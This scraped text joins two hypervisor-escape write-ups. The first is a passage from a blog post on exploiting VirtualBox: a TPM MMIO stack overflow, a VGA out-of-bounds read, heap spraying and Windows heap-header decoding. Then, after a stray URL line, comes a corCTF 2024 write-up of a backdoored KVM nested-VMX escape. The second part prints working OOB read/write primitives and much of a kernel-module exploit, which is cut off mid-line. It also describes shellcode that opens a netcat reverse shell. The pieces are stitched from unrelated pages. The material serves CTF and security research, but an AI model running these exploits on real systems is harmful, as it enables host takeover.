instead:__m256 z = _mm256_load_ps((const float*)off); Indeed, it works! cb is now 0x20 and I can overwrite 0x18 bytes after u64 variable. But the is a problem: u64 is behind the return address of VBoxDDR0!tpmMmioRead. Let’s look at the stack when RIP is at the very first instruction of VBoxDDR0!tpmMmioRead:2: kd> dq @rsp ffffbb80`814920a8 fffff804`d2432993 ffff8901`0ecc0000 ffffbb80`814920b8 000fffff`fffff000 ffff8901`0edc6760 ffffbb80`814920c8 fffff804`d243418b 00000000`00000020 ffffbb80`814920d8 fffff804`d2458b1d ffffe289`26bf7000 ffffbb80`814920e8 00000000`00000020 ffff8901`0ede4000 ffffbb80`814920f8 00000000`00000080 ffff8901`0ecc0000 ffffbb80`81492108 fffff804`d243313f ffffe289`26b87188 ffffbb80`81492118 fffff804`d2451c8b 00000000`fed40080 Remember that the return address is at 0xffffbb80814920a8. Now let’s run until RIP is at call VBoxDDR0!tpmMmioFifoRead:2: kd> dq @rsp ffffbb80`81492060 ffff8901`0ecc0000 00000000`00000000 ffffbb80`81492070 00000000`00000060 fffff804`d253ba1b ffffbb80`81492080 00000000`00000080 ffffbb80`814920b0 <-- pu64 ffffbb80`81492090 00000000`00000020 00000000`00000018 ffffbb80`814920a0 ffff8901`0ede4140 fffff804`d2432993 <-- R.A ffffbb80`814920b0 ffff8901`0ecc0000 ffffe289`26b87188 ffffbb80`814920c0 00000000`00000080 fffff804`d243418b ffffbb80`814920d0 00000000`00000020 fffff804`d2458b1d Based on the x64 Windows calling convention, the 5th argument is at [rsp+0x28], so the address of u64 is 0xffffbb80814920b0, which is behind the return address (0xffffbb80814920a8). Why does this happen? I don’t really know, but I guess this is some kind of compiler optimization. Let’s check tpmMmioRead in IDA:unsigned __int64 pu64; // [rsp+50h] [rbp+8h] BYREF The assembly code:.text:000000014002BA10 000 mov  [rsp+10h], rbx .text:000000014002BA15 000 mov  [rsp+18h], rsi .text:000000014002BA1A 000 push rdi .text:000000014002BA1B 008 sub  rsp, 40h .text:000000014002BA1F 048 mov  rdx, [rcx+10h] ; pThis pu64 is at [rsp+0x50], but the function only allocate 0x48 bytes for the stack. Clearly, pu64 is outside of the stack frame range. So in which function stack frame does this variable belong to? Well, it is right next to the return address, so it is in the shadow space. Turned out that, the shadow space is used to make debugging easier. But we are using the “Release” build, so it will use the shadow space as if it is a normal space. We can overwrite 0x18 bytes after the u64 variable. Unfortunately, there is no data after u64 so we can’t do anything. I’m stuck now. Maybe if my CPU supports AVX-512, I can do something? Until now, @bienpnn told me that there is an instruction which can read up to 512 bytes. It is fxrstor, which is used to restore x87 FPU, MMX, XMM, and MXCSR state. Knowing this, I tried this code:_fxrstor64((void*)off); And then, VirtualBox.exe crashed! That’s good. But wait, why does it crash without first hitting the breakpoint at VBoxDDR0!tpmMmioRead? Turned out that all the request with cb >= 0x80 will be handled by R3 code. This is the comment in src\VBox\VMM\VMMAll\IOMAllMmioNew.cpp:/* * If someone is doing FXSAVE, FXRSTOR, XSAVE, XRSTOR or other stuff dealing with * large amounts of data, just go to ring-3 where we don't need to deal with partial * successes. No chance any of these will be problematic read-modify-write stuff. * * Also drop back if the ring-0 registration entry isn't actually used. */ Let’s trigger this bug again. But this time we will set a breakpoint at VBoxDD!tpmMmioRead instead. And now I can see a stack buffer overflow.Really nice. Now we have RIP controlled, but don’t know where to jump. We need a leak.The OOB read bugThe OOB read bug is inside VGA module. There are a lot of files belong to this module, but I choose to read DevVGA.cpp first, since the name looks like the main file of VGA module. I look at the 2 construction functions to see which IO port or memory mapped is used. I found that the vgaMmioRead will handle the MMIO request, it will then call vga_mem_readb. And inside this function, I found the code below (we can control addr):pThis->latch = !pThis->svga.fEnabled   ? ((uint32_t *)pThisCC->pbVRam)[addr]    : addr < VMSVGA_VGA_FB_BACKUP_SIZE ? ((uint32_t *)pThisCC->svga.pbVgaFrameBufferR3)[addr] : UINT32_MAX; pThis->svga.fEnabled is true so we only care about this line:addr < VMSVGA_VGA_FB_BACKUP_SIZE ? ((uint32_t *)pThisCC->svga.pbVgaFrameBufferR3)[addr] : UINT32_MAX; VMSVGA_VGA_FB_BACKUP_SIZE is the size of pThisCC->svga.pbVgaFrameBufferR3. Maybe you can see what’s wrong here.((uint32_t *)pThisCC->svga.pbVgaFrameBufferR3)[addr] is equivalent to:*(uint32_t *)(pThisCC->svga.pbVgaFrameBufferR3 + sizeof(uint32_t) * addr) // note that the type of pThisCC->svga.pbVgaFrameBufferR3 is uint8_t[] The code checks if addr < VMSVGA_VGA_FB_BACKUP_SIZE, but actually uses 4 * addr for indexing. It means that we have an OOB read here. Untill now, I thought that it will be easy because with a leak and a stack buffer overflow, I would easily do a ROP chain. But I regret soon when I see that the heap layout is not static, it changes everytime I open a new VirtualBox process. The reason for this is because VirtualBox is a very complex software, so heap allocations are made everywhere, which changes the shape of the heap.ExploitationNow I need a reliable way to have a leak. For this, I will use heap spraying technique. So my plan is to poison the heap with a lot of objects that I control, and (hopefully) some of the objects will be right behind the pbVgaFrameBufferR3 buffer so that I can use the OOB read to leak information. sauercl0ud team had already written a nice blog post about exploiting VirtualBox. Inside the post, they sprayed the heap with HGCMMsgCall objects, I will just use HGCMMsgCall too, because why not :D ?What is HGCM?HGCM is an abbreviation for “Host/Guest Communication Manager”. This is the module used for communication between the host and the guest. For example, they need to talk to each other in order to implement the “Shared Clipboard”, “Shared Folder”, “Drag and drop” services.Here’s how it works. The guest inside VirtualBox will have to install additional drivers, a.k.a the guest additions. When the guest wants to use one of the service above, it will send a message to the host through IO port, the message is represented by the HGCMMsgCall struct.0:035> dt VBoxC!HGCMMsgCall +0x000 __VFN_table : Ptr64  +0x008 m_cRefs   : Int4B +0x00c m_enmObjType  : HGCMOBJ_TYPE +0x010 m_u32Version  : Uint4B +0x014 m_u32Msg   : Uint4B +0x018 m_pThread  : Ptr64 HGCMThread +0x020 m_pfnCallback : Ptr64  int  +0x028 m_pNext   : Ptr64 HGCMMsgCore +0x030 m_pPrev   : Ptr64 HGCMMsgCore +0x038 m_fu32Flags  : Uint4B +0x03c m_rcSend   : Int4B +0x040 pCmd    : Ptr64 VBOXHGCMCMD +0x048 pHGCMPort  : Ptr64 PDMIHGCMPORT +0x050 pcCounter  : Ptr64 Uint4B +0x058 u32ClientId  : Uint4B +0x05c u32Function  : Uint4B +0x060 cParms   : Uint4B +0x068 paParms   : Ptr64 VBOXHGCMSVCPARM +0x070 tsArrival  : Uint8B This object is perfect because:It has a vtable pointer -> We can leak a library addressIt has m_pNext and m_pPrev, which points to next and previous HGCMMsgCall in a doubly linked list -> Also good, can be used to leak heap address.Now I will spray the heap with a lot of HGCMMsgCall. This code is just copied from Sauercl0ud blog:void spray() {  int rc;  for (int i = 0; i < 64; ++i)  {   int32_t clientId;   rc = hgcm_connect(""VBoxGuestPropSvc"", &clientId);   for (int j = 0; j < 16 - 1; ++j)   {    char pattern[0x70];    char out[2];    rc = wait_prop(clientId, pattern, strlen(pattern) + 1, out, sizeof(out)); // call VBoxGuestPropSvc HGCM service, this will allocate a HGCMMsgCall   }  } } After some observation, I realize that the vtable is usually 0x7F??????AD90. Only the ? part is randomized, I will use this information to identify a HGCMMsgCall on the heap. My approach is simple: I just keep reading a qword (8 bytes) each time, called X. I will then check if (X & 0xFFFF) == 0xAD90 and (X >> 40) == 0x7F. If this is true, we likely to reach a HGCMMsgCall, and X is the vtable pointer. To leak heap address, I will do like this (this idea is also taken from Sauercl0ud blog):Find a HGCMMsgCall on the heap. Let’s call this object A and let’s call a the offset from the pbVgaFrameBufferR3 buffer to this object.Find another HGCMMsgCall. B and b are the same as above, and b > a.If A->m_pNext - B->m_pPrev == b - a, then it’s likely that A->m_pNext is the address of B. It means that A->m_pNext - b is the address of pbVgaFrameBufferR3 buffer.Actually I don’t need a heap leak to make a ROP chain, only a DLL leak is enough. But I want to show you this method so that you can make a longer ROP chain in case you need it.Now I have enough information to write an exploit.Testing out the exploitation ideaI implement the idea above, and run the exploit for 20 times and not a single time success. That’s 0% of success rate, very bad. Most of the time, VirtualBox just crashes. I attached a debugger and ran the exploit again, the crash happened when trying to read an address that had not been mapped. Turned out that I could read up to 0x180000 bytes (1.5MB) after the pbVgaFrameBufferR3 buffer, but most of the time there is only about ~ 0xC0000 bytes that had been mapped. Another crash I found is when the exploit was trying to read an address inside a guard page. Another problem I had is that the exploit run really slow, because the OOB bug only lets me read 1 byte at a time. I need to improve the speed of the exploit as well.Parsing heap header to avoid unmmaped pages and increase speedUntil now, I have a new idea: parsing the heap chunk headers on the heap to gain more information. First thing I want to do is to read some information about a chunk, for example, the size of the chunk, is it freed or in used? If I can do this, maybe I will be able to skip some unnecessary chunks. To make this idea come true, I have to learn some Windows heap internal. I recommend you to read these:Windows 10 NT heap internalsWindows 8 heap internalsBasically, a heap chunk is represented by _HEAP_ENTRY structure:0:035> dt _HEAP_ENTRY ntdll!_HEAP_ENTRY  ... +0x008 Size    : Uint2B +0x00a Flags   : UChar  ... +0x00c PreviousSize  : Uint2B  ... Size is the size of the chunk (include the header itself), PreviousSize is the size of the previous chunk (in memory), and Flags contains extra information about a chunk, for example: is it free or in used.Actually Size (and PreviousSize) is the size of a chunk in blocks, not in bytes. 1 block is 16 bytes in length.Parsing heap header is easy. 16 bytes after pbVgaFrameBufferR3 is the chunk header of a chunk, so I can read it, get the Size and just do it again … But there is a problem: the chunk header is encoded, it is xorred with _HEAP->Encoding. I will give you an example.0:042> !heap -i 26855e40000    Heap context set to the heap 0x0000026855e40000 0:042> db 0000026859f1f010 L0x10 00000268`59f1f010 0c 00 02 02 2e 2e 00 00-dd e0 1a 38 cd be b2 10 ...........8.... 0:042> !heap -i 0000026859f1f010 Detailed information for block entry 0000026859f1f010 Assumed heap  : 0x0000026855e40000 (Use !heap -i NewHeapHandle to change) Header content  : 0x381AE0DD 0x10B2BECD (decoded : 0x08010801 0x10B28201) Owning segment  : 0x00000268593f0000 (offset b2) Block flags  : 0x1 (busy ) Total block size : 0x801 units (0x8010 bytes) Requested size  : 0x8000 bytes (unused 0x10 bytes) Previous block size: 0x8201 units (0x82010 bytes) Block CRC   : OK - 0x8 Previous block  : 0x0000026859e9d000 Next block   : 0x0000026859f27020 The output of !heap -i said that the header content is 0x381AE0DD 0x10B2BECD, but after decoded it is 0x08010801 0x10B28201. Let’s confirm this0:042> db 0000026859f1f010 L0x10 00000268`59f1f010 0c 00 02 02 2e 2e 00 00-dd e0 1a 38 cd be b2 10 ...........8.... 0:042> dt _HEAP ntdll!_HEAP +0x000 Segment   : _HEAP_SEGMENT  ... +0x080 Encoding   : _HEAP_ENTRY // <-- The key to decode  ... 0:042> dq 26855e40000+0x80 L2 00000268`55e40080 00000000`00000000 00003ccc`301be8dc So the key is 0x00003ccc301be8dc. 0x00003ccc301be8dc ^ 0x10b2becd381ae0dd = 0x10b2820108010801, which is exactly what shown in !heap -i command.So to parse a chunk header, we need to leak the _HEAP->Encoding. I can’t not directly leak it but I have an idea to calculate it. pbVgaFrameBufferR3 has the size of 0x80010 bytes (include the header), so the chunk right behind it (let’s call this chunk A) must have PreviousSize equals to 0x8001. Knowing this, I can calculate 2 bytes key to decode PreviousSize.KeyToDecodePreviousSize = A->PreviousSize ^ 0x8001 Next, I find another chunk after chunk A, let’s call this chunk B. B is likely to be a valid chunk if:(B->PreviousSize ^ KeyToDecodePreviousSize) << 4 == Distance between A and B B->PreviousSize ^ KeyToDecodePreviousSize is also the value of A->Size ^ KeyToDecodeSize, so:KeyToDecodeSize = B->PreviousSize ^ KeyToDecodePreviousSize ^ A->Size Now I am able to decode Size and PreviousSize. What about the Flags? I don’t know a good way to decode it, so I just run VirtualBox multiple times and observe that most of the time chunk A is in used. So if any other chunk has the LSB bit of Flags equals to the LSB bit of A->Flags, then it is also in used and vice versa. With this informaton, I can walk the heap easily, the algorithm looks like this:uint32_t curOffset = 0x80000; while (curOffset < 0x200000) { // 0x200000 is the maximum we can touch  HEAP_ENTRY hE;  readHeapEntry(curOffset, &hE);  if (isInUsed(&hE))   findSprayedObjects(curOffset, &hE);  curOffset += ((hE.Size ^ KeyToDecodeSize) << 4); // 1 block is 16 bytes } Now my exploit runs a lot faster, also the success rate is increased a little. But sometime the exploit still crashed VirtualBox. I attach Windbg and see that it was trying to access a guard page, and this guard page is inside an in-used chunk. After a few days of researching, I finally knew that chunk was a UserBlocks.How does LFH work and what is a UserBlocks?Quoted from Microsoft:Heap fragmentation is a state in which available memory is broken into small, noncontiguous blocks. When a heap is fragmented, memory allocation can fail even when the total available memory in the heap is enough to satisfy a request, because no single block of memory is large enough. The low-fragmentation heap (LFH) helps to reduce heap fragmentation. The LFH is not a separate heap. Instead, it is a policy that applications can enable for their heaps. When the LFH is enabled, the system allocates memory in certain predetermined sizesWhen an application makes more than 17 allocations of the same size, the LFH will be turned on (for that size only). We spray a lot of objects (more than 17), so they will all be served by the LFH. Basically this is how LFH works:A big chunk will be allocated, this is a UserBlocks struct. A UserBlocks contains some metadata and a lot of small chunks.Any heap allocation after that will return a (freed) small chunk in the UserBlocks.A UserBlocks is represented by a _HEAP_USERDATA_HEADER struct:0:042> dt _HEAP_USERDATA_HEADER ntdll!_HEAP_USERDATA_HEADER +0x000 SFreeListEntry : _SINGLE_LIST_ENTRY +0x000 SubSegment  : Ptr64 _HEAP_SUBSEGMENT +0x008 Reserved   : Ptr64 Void +0x010 SizeIndexAndPadding : Uint4B +0x010 SizeIndex  : UChar +0x011 GuardPagePresent : UChar +0x012 PaddingBytes  : Uint2B +0x014 Signature  : Uint4B +0x018 EncodedOffsets : _HEAP_USERDATA_OFFSETS +0x020 BusyBitmap  : _RTL_BITMAP_EX +0x030 BitmapData  : [1] Uint8B There is 2 important things to note here:The _HEAP_USERDATA_HEADER is not encoded like the HEAP_ENTRY. A UserBlocks is also a regullar chunk, so it is in the “user data” part of another HEAP_ENTRY.Signature is always 0xF0E0D0C0, so we can easily find it in the heap.GuardPagePresent: if this is non zero, the UserBlocks has a page guard at the end, so we can skip 0x1000 bytes at the end, preventing crashes.BusyBitmap contains the address of BitmapData. This can be used as a reliable way to leak heap address tooKnowing that all the HGCMMsgCall sprayed by us will be served by LFH, I will only find them in a UserBlocks. This makes the exploit run a lot of faster than the first exploit I made.More success rate, more speedI also noted that each time I want to send a HGCM message, I have to create a HGCMClient. Since there are many HGCMClients being allocated when spraying, I also look for their vtable pointer.One more thing is that every chunk address will have to be the multiple of 0x10, so I only read qwords at these locations to find vtable. This will also increase the speed of my exploit.ConclusionI would like to give a special thanks to my mentor @bienpnn, who was actively helping me throughout the project. This is my first time exploiting a real Windows software so it is really fun. After this project, I learned more about Windows heap internal, how a hypervisor works, how to debug Windows kernel and a ton of other knowledge. I hope this post can help you if you are about to target VirtualBox, and see you in another blog post! © 2024 Qrious Secure""To err is human, to hack is divine.""Built with HugoTheme Stack designed by Jimmy  "
https://www.willsroot.io/2024/08/trojan-turtles.html,"     Will's Root: corCTF 2024 - Trojan Turtles: A KVM Escape Exploit from the L2 Guest to the L1 Hypervisor                  Will's Root  Pentesting, CTFs, and Writeups      Search This Blog                       Sunday, August 4, 2024  corCTF 2024 - Trojan Turtles: A KVM Escape Exploit from the L2 Guest to the L1 Hypervisor  For the past several iterations of corCTF, we have hoped to release 2 new types of challenges in our competition: a Windows kernel and a hypervisor escape challenge. With less than 2 days to go before this year’s CTF, we only had 3 pwnable challenges. There was an incoming potential Windows kernel challenge marred by infrastructure difficulties (which never made it to release despite our tweet poking fun at Crowdstrike), so I decided to try my hand at making a simple hypervisor escape challenge. Inspired by Project Zero’s crazy SVM nested KVM escape exploit, I decided to dig briefly into KVM’s VMX nested hypervisor.  Nested virtualization is actually quite an interesting topic, and the name of this challenge comes from the original nested KVM paper: The Turtles Project. I recommend that you read the paper, but as a quick high level overview, Intel VMX provides a set of instructions for hardware accelerated virtualization. Virtualized execution is effectively native, except for when traps (VM-exits) occur and require the original host to handle - these traps can be caused by events like MMIO read/writes or certain instructions that VMX operation do not support (like VMX instructions themselves). To support nested guests, Intel and AMD follow the model of a single hypervisor handling all guests and nested guests. The root hypervisor at L0 can then emulate VMX instructions for its L1 guest for when the L1 guest becomes the “KVM hypervisor” for the L2 guest. L0 would thus setup all the VMX structures that L1 is attempting to create for L2 and then basically run L2 as if it is at the same level as the L1 guest (the paper uses the term guest “multiplexing”). When a VM-exit happens, the L0 hypervisor would have to then decide which guest, if any, to forward the handling to. At each level (L0, L1, L2, L3, etc.), the KVM driver thinks of itself as L0 and can have its own guests and provide VMX emulation for its nested guests. With this idea, we can have nested hypervisors to an arbitrary depth (with terrible performance implications the deeper we go). For starters, the L1 VM ran a 6.9.0 Linux kernel from the following run script. #!/bin/sh qemu-system-x86_64 \  -m 1024 \  -nographic \  -no-reboot \  -kernel bzImage-6.9 \  -append ""console=ttyS0 root=/dev/sda quiet loglevel=3 rd.systemd.show_status=auto rd.udev.log_level=3 panic=-1 net.ifnames=0 pti=off no5lvl"" \  -hda chall.qcow2 \  -snapshot \  -netdev user,id=net \  -device e1000,netdev=net \  -monitor /dev/null \  -cpu host \  -smp cores=2 \  --enable-kvmIt ran an Alpine Busybox system with the OpenRC init system. Upon startup, it ran the following startup script as a low-privileged user to boot the L2 guest into superuser, which ran an Ubuntu 5.15.0-107 HWE kernel:#!/bin/sh cd /vm qemu-system-x86_64 \  -m 512 \  -smp 1 \  -nographic \  -kernel ""./bzImage"" \  -append ""console=ttyS0 loglevel=3 panic=-1 pti=off kaslr no5lvl"" \  -no-reboot \  -netdev user,id=net \  -device e1000,netdev=net \  -monitor /dev/null \  -cpu host \  -initrd ""./initramfs.cpio.gz"" \  -enable-kvmAs stated in the description, the goal is to escape from the L2 guest into the L1 host with root privileges. Provided to the players were two KVM drivers used in the L1 host, with one backdoored as a play off the recent xz supply chain fiasco. With binary diffing tools like BinDiff or Diaphora, one can quickly that there are only two differences, in the handle_vmread and the handle_vmwrite functions. In both cases, an extra snippet of code was added before the inlined call to get_vmcs12_field_offset after some simple vmread and vmwrite condition checks. For handle_vmread it was the following: if (kvm_get_dr(vcpu, 0) == 0x1337babe) { int64_t offset = kvm_get_dr(vcpu, 1); kvm_set_dr(vcpu, 2, *(((uint64_t* )vmcs12) + offset)); }And for handle_vmwrite:  if (kvm_get_dr(vcpu, 0) == 0x1337babe) { int64_t offset = kvm_get_dr(vcpu, 1); uint64_t val = kvm_get_dr(vcpu, 2); *(((uint64_t *)vmcs12) + offset) = val; }Basically, if the debug register dr0 holds a specific magic value, then dr1 and dr2 are used to perform arbitrary OOB read/write from the emulated vmcs12 structure the hypervisor allocates for nested guests. More specifically, this vmcs12 structure is allocated in the L1 host (running under an L0 host) when it performs VMX emulation for an L2 guest attempting to kick off an L3 guest - all these layers can become really confusing! The following two article series do a really good job explaining how to commence VMX execution modes for hypervisor development: https://rayanfam.com/topics/hypervisor-from-scratch-part-3/, https://revers.engineering/7-days-to-virtualization-a-series-on-hypervisor-development/. To trigger the evil code path, all we have to do is to enter VMX root operation with the vmxon instruction and declare a VMCS (Virtual-Machine Control Structure) with the vmptrld instruction. VMX root operation allows the hypervisor to prepare and control the behavior of the guest, which runs in non-root operation. When executing vmxon in a guest, the emulated VMX handler handle_vmxon zero-allocates a page for the nested guest’s VMCS structure. For triggering and utilizing the backdoor, I created the following primitives: static uint8_t vmxon(volatile uint64_t phys) {  uint8_t ret;  asm volatile(INTEL(   ""vmxon [%[phys]];"" ""setna %[ret];"")    :[ret]""=r""(ret):[phys]""r""(&phys):);  return ret; } static uint8_t vmptrld(volatile uint64_t phys) {  uint8_t ret;  asm volatile(INTEL(   ""vmptrld [%[phys]];"" ""setna %[ret];"")    :[ret]""=r""(ret):[phys]""r""(&phys):);  return ret; } static uint64_t vmread(volatile uint16_t field) {  uint8_t ret;  uint64_t result;  asm volatile(INTEL(   ""vmread [%[result]], %[field];"" ""setna %[ret];"")    :[ret]""=r""(ret):[result]""r""(&result),[field]""r""((uint64_t)field):);  if (ret)  {   printk(KERN_WARNING ""vmread of field 0x%x failed "", field);  }  return (ret)?ret:result; } static uint8_t vmwrite(volatile uint16_t field, volatile uint64_t val) {  uint8_t ret;  asm volatile(INTEL(   ""vmwrite %[field], [%[val]];"" ""setna %[ret];"")    :[ret]""=r""(ret):[val]""r""(&val),[field]""r""((uint64_t)field):);  return ret; } #define BACKDOOR_TRIGGER 0x1337babe #define VM_FUNCTION_CONTROL 0x00002018 #define STRINGIFY(x) #x #define STRINGIFY_INT(x) STRINGIFY(x) static uint64_t oob_read(uint64_t offset) {  uint8_t err;  uint64_t val;  asm volatile(INTEL(   ""mov rax, "" STRINGIFY_INT(BACKDOOR_TRIGGER) "";"" ""mov dr0, rax;"" ""mov rax, %[offset];"" ""mov dr1, rax;"" ""mov rdi, "" STRINGIFY_INT(VM_FUNCTION_CONTROL) "";"" ""call %[vmread];"" ""mov %[err], al;"")    :[err]""=r""(err):[offset]""r""(offset),[vmread]""r""(&vmread):""rax"",""rdi"");  if (err) {   printk(KERN_INFO ""oob read 0x%llx failure "", offset);   asm volatile (""ud2;"");  }  asm volatile(INTEL(   ""mov rax, dr2;"" ""mov %[val], rax;"")    :[val]""=r""(val)::""rax"");  return val; } static void oob_write(uint64_t offset, uint64_t val) {  uint8_t err;  asm volatile(INTEL(   ""mov rax, "" STRINGIFY_INT(BACKDOOR_TRIGGER) "";"" ""mov dr0, rax;"" ""mov rax, %[offset];"" ""mov dr1, rax;"" ""mov rax, %[val];"" ""mov dr2, rax;"" ""mov rdi, "" STRINGIFY_INT(VM_FUNCTION_CONTROL) "";"" ""call %[vmwrite];"" ""mov %[err], al;"")    :[err]""=r""(err):[offset]""r""(offset),[val]""r""(val),[vmwrite]""r""(&vmwrite):""rax"",""rdi"");  if (err) {   printk(KERN_INFO ""oob write 0x%llx (%llx) failure "", offset, val);   asm volatile (""ud2;"");  } }Now, the L2 guest has arbitrary OOB read and write in the L1 hypervisor’s kernel. At this point, the challenge just becomes a case of “pwn the kernel” given arbitrary OOB read/write on the kernel heap, albeit without a shell on the host. It’s not particularly difficult, so I will just outline my approach. I first wipe the first qword of the guest kernel memory and the guest’s modprobe_path. This is useful for the next step to avoid a potential L1 kernel crash. The beginning of the physical zero page contains many instances of the qword 0xf000ff53, which are probably just real mode far pointers from bootloader or firmware execution. I now scan for L1’s kernel modprobe_path's address from L1’s physmap’s perspective. A pattern that will often repeat itself is xor-encrypting the search target and xor-decrypting the results from the OOB read. This mechanism prevents my read/write primitives from accidentally reading into this exploit driver itself. Additionally, I optimize the search by using the known last 12 bits of the target item so the search interval can be done in 0x1000 intervals (as the vmcs12 structure itself is page sized). Note that to account for the hypervisor modprobe_path being either before or after vmcs12 in physmap, I search backwards until I encounter 0xf000ff53. If the search has not been successful yet, I start searching forward (otherwise, I’ll read before physical memory zero and crash the L1 host). With modprobe_path’s location in L1 physmap found, I can now figure out L1’s physmap base by computing the relative offset of page_offset_base and performing another OOB read. I can also figure out the location of L1 kernel base from the physmap view, as well as where my current vmcs12 is located in the L1 kernel virtual address space. This last piece of information would then unlock arb read and write primitives. Looking into the future, the ultimate goal for privilege escalation is to hijack a function pointer. The aforementioned Project Zero SVM escape exploit provided a great target: kvm->arch.kvmclock_update_work.work.func. How do we find the kvm struct for our current L2 guest in the L1 host? We can accomplish this by searching for the kvm_vcpu struct, whose first field points to the kvm struct. To find the kvm_vcpu struct, we can probe for its arch field of kvm_vcpu_arch by setting the dr3 register. kvm_vcpu are allocated from the KVM_CREATE_VCPU ioctl to the KVM driver and are pulled from its own kmem_cache. Based on /proc/slabinfo, each slab only holds 3 of these objects, with the lower 12 bits of the dr3 storage location being 0xb80, 0xc40, and 0xd00. Now, with the knowledge of the L1 virtual addresses for our L2 guest’s kvm and kvm_vcpu struct, we figure out what the target function pointer currently holds. This will be used as a continuation function to seamlessly resume normal system operation after our exploit payload triggers. Here is where the fun part of my exploit begins. Using knowledge of the L1 physmap and kernel layout, I walk the task_struct objects starting from init_task to find the mm pointer, from which I can read the pgd field - this allows me to know the root page table pointer (or PML4 pointer for 4 level paging systems - x86_64 paging terminology can get really confusing) for a given task in the L1 kernel. I then find the location of the PUD based on the L1 physmap virtual address to get the PUD table that control the kernel mapping which every task should share. While traversing the list of tasks, one can also fetch the actual virtual address for the kernel .text base based on the linked lists that connect back to init_task. Now I find a free entry in the PUD to add an entry that maps a 1 GB huge page starting from physical address 0 that is read, write, and execute. I then fill up L1 physical page 0 with shellcode that basically does call_usermodehelper to run a netcat reverse shell with UMH_WAIT_EXEC. Execution can then continue after the reverse shell process begins and I trampoline it back to the original function in kvm->arch.kvmclock_update_work.work.func. While I could have modified existing pagetable entries in the L1 host, I would have to ensure that entries were flushed from the TLB for the permissions to become architecturally visible. Now, I overwrote the target function pointer to the new evil rwx page and wait around 5 minutes (as mentioned in the Project Zero exploit). While the system continues to function smoothly, I eventually get a reverse shell with the hypervisor escaped! Here is the final exploit: #include <asm-generic/io.h> #include <linux/kernel.h> #include <linux/module.h> #include <linux/device.h> #include <linux/mutex.h> #include <linux/fs.h> #include <linux/miscdevice.h> #include <linux/kmod.h> #include <linux/kprobes.h> #include <linux/types.h> #include <linux/slab.h> #include <linux/mm.h> MODULE_LICENSE(""GPL""); MODULE_AUTHOR(""FizzBuzz101""); #define INTEL(x) \  "".intel_syntax noprefix;"" \  x \  "".att_syntax;"" #define IA32_FEATURE_CONTROL 0x3a #define IA32_VMX_BASIC   0x480 #define IA32_VMX_CR0_FIXED0  0x486 #define IA32_VMX_CR0_FIXED1  0x487 #define IA32_VMX_CR4_FIXED0  0x488 #define IA32_VMX_CR4_FIXED1  0x489 typedef union { uint64_t value;  struct  { uint64_t lock : 1;   uint64_t enable_smx : 1;   uint64_t enable_vmxon : 1;   uint64_t reserved : 61;  } fields; } IA32_FEATURE_CONTROL_MSR; typedef struct { uint32_t revision : 31;  uint32_t shadow_vmcs : 1; }vmxon_region_t; typedef struct { struct  { uint32_t revision : 31;   uint32_t shadow_vmcs : 1;  }header; }vmcs_region_t; static struct kprobe kp = {  .symbol_name = ""kallsyms_lookup_name"" }; static unsigned long (*find_symbol)(const char* name); static bool supports_vmx(void) {  // Intel SDM 22.6-7 uint32_t eax, ebx, ecx, edx;  IA32_FEATURE_CONTROL_MSR feature_msr;  cpuid(0, &eax, &ebx, &ecx, &edx);  // check if GenuineIntel if (ebx != 0x756e6547 || edx != 0x49656e69 || ecx != 0x6c65746e)   return false;  cpuid(1, &eax, &ebx, &ecx, &edx);  // check for VMX support if (!(ecx & (1 << 5)))   return false;  // check 0x3a MSR on IA32_FEATURE_CONTROL,  rdmsrl(IA32_FEATURE_CONTROL, feature_msr.value);  if (!feature_msr.fields.lock)  {   feature_msr.fields.lock = 1;   feature_msr.fields.enable_vmxon = 1;   wrmsrl(IA32_FEATURE_CONTROL, feature_msr.value);  }  else if (!feature_msr.fields.enable_vmxon)  {   return false;  }  return true; } static uint64_t read_cr4(void) {  uint64_t cr4 = 0;  asm volatile(INTEL(   ""mov %0, cr4 "")  :""=r""(cr4)::);  return cr4;  } static void write_cr4(uint64_t cr4) {  asm volatile(INTEL(   ""mov cr4, %0 "")  ::""r""(cr4):);  } // entering with VMXON without CR4.VMXE results in UD, and set up MSRs accordingly static void enable_vmxe(void) {  uint64_t msr_cr0_0, msr_cr0_1, msr_cr4_0, msr_cr4_1, cr0, cr4;  cr4 = read_cr4();  cr4 |= 1 << 13;  write_cr4(cr4);  // fix up CR0 and CR4  rdmsrl(IA32_VMX_CR0_FIXED0, msr_cr0_0);  rdmsrl(IA32_VMX_CR0_FIXED1, msr_cr0_1);  rdmsrl(IA32_VMX_CR4_FIXED0, msr_cr4_0);  rdmsrl(IA32_VMX_CR4_FIXED1, msr_cr4_1);  cr0 = read_cr0();  cr4 = read_cr4();  cr0 = (cr0 | msr_cr0_0) & msr_cr0_1;  cr4 = (cr4 | msr_cr4_0) & msr_cr4_1;  write_cr0(cr0);  write_cr4(cr4); } static inline void initialize_vmxon(vmxon_region_t *region) {  uint64_t revision;  rdmsrl(IA32_VMX_BASIC, revision);  region->revision = revision; } static inline void initialize_vmcs(vmcs_region_t *region, bool shadow) {  uint64_t revision;  rdmsrl(IA32_VMX_BASIC, revision);  region->header.revision = revision;  region->header.shadow_vmcs = (shadow)?1:0; } static uint8_t vmxon(volatile uint64_t phys) {  uint8_t ret;  asm volatile(INTEL(   ""vmxon [%[phys]];"" ""setna %[ret];"")    :[ret]""=r""(ret):[phys]""r""(&phys):);  return ret; } static uint8_t vmptrld(volatile uint64_t phys) {  uint8_t ret;  asm volatile(INTEL(   ""vmptrld [%[phys]];"" ""setna %[ret];"")    :[ret]""=r""(ret):[phys]""r""(&phys):);  return ret; } static uint64_t vmread(volatile uint16_t field) {  uint8_t ret;  uint64_t result;  asm volatile(INTEL(   ""vmread [%[result]], %[field];"" ""setna %[ret];"")    :[ret]""=r""(ret):[result]""r""(&result),[field]""r""((uint64_t)field):);  if (ret)  {   printk(KERN_WARNING ""vmread of field 0x%x failed "", field);  }  return (ret)?ret:result; } static uint8_t vmwrite(volatile uint16_t field, volatile uint64_t val) {  uint8_t ret;  asm volatile(INTEL(   ""vmwrite %[field], [%[val]];"" ""setna %[ret];"")    :[ret]""=r""(ret):[val]""r""(&val),[field]""r""((uint64_t)field):);  return ret; } #define BACKDOOR_TRIGGER 0x1337babe #define VM_FUNCTION_CONTROL 0x00002018 #define STRINGIFY(x) #x #define STRINGIFY_INT(x) STRINGIFY(x) static uint64_t oob_read(uint64_t offset) {  uint8_t err;  uint64_t val;  asm volatile(INTEL(   ""mov rax, "" STRINGIFY_INT(BACKDOOR_TRIGGER) "";"" ""mov dr0, rax;"" ""mov rax, %[offset];"" ""mov dr1, rax;"" ""mov rdi, "" 